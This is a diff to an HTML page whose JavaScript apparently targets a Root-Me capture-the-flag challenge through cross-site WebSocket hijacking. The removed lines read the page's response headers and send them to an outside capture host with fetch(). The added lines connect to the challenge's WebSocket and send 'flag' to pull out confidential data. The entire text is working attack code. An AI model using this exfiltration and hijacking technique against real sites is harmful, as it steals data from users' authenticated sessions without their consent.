@@ -46,16 +46,11 @@
 <body>
     <p id="color">#000000</p>
     <script>
-        var request = new XMLHttpRequest ();
-        request.open ('GET', document.location, false);
-        request.send (null);
-        var headerz = request.getAllResponseHeaders (). toLowerCase ();
-        fetch('https://websocket.free.beeceptor.com/head/?'+headerz, {mode: 'no-cors'})
-        websocket = new WebSocket('ws://'+window.location.hostname+'/ws')
+        websocket = new WebSocket('ws://ctf15.root-me.org/ws')
         websocket.onopen = start
         websocket.onmessage = handleReply
         function start(event) {
-            websocket.send("READY"); //Send the message to retreive confidential information
+            websocket.send("flag"); //Send the message to retreive confidential information
         }
         websocket.send("flag")
         function handleReply(event) {
